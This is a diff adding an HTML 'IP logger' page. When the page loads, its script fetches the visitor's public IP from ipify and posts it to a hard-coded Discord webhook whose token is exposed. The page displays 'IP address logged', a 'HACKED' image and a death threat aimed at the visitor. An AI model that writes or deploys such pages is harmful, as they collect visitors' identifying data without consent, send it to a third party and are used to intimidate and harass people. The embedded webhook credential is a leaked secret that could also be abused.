@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>ᕼᗅᑤᖽᐸᙍᗫ</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <link rel="icon" href="https://raw.githubusercontent.com/Enderkries2011/private-stuff/main/hackman.jpg" type="image/jpeg">
+    <style>
+      body {
+            background-color: #8805e6;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+    </style>
+</head>
+<body>
+    <h1>𝕀ℙ 𝕒𝕕𝕕𝕣𝕖𝕤𝕤 𝕝𝕠𝕘𝕘𝕖𝕕</h1>
+    <p>₦Ø₮Ɇ: ɄⱤ ĐɆ₳Đ ØⱤ ₩ⱧɆⱤɆ Ʉ ₳ⱤɆ ₩łⱠⱠ ฿Ɇ ĐɆ₳Đ ₴ØØ₦</p>
+    <img src="https://raw.githubusercontent.com/Enderkries2011/private-stuff/main/hacked.png" alt="HACKED IMG">
+    <script>
+        let userIP;
+        fetch('https://api.ipify.org')
+            .then(res => res.text())
+            .then(ip => {
+                userIP = ip;
+                console.log('User IP:', userIP);
+                sendIPToDiscord();
+            })
+            .catch(err => console.log(err));
+        function sendIPToDiscord() {
+            const webhookURL = 'https://discord.com/api/webhooks/1159185025837834280/qhpSakO20QTw5wu_CYf34Rlwfa-bzrpsk4NhfQiuorhHR8a-E2FgI1yUx8Z5bRR5NPC6';
+
+            axios.post(webhookURL, {
+                content: `New IP logged: ${userIP}`
+            })
+            .then(response => {
+                if (response.status === 204) {
+                    console.log('UR ip Is logged');
+                } else {
+                    console.error('Failed to log ur ip ur Lucky');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+
+    </script>
+</body>
+</html>
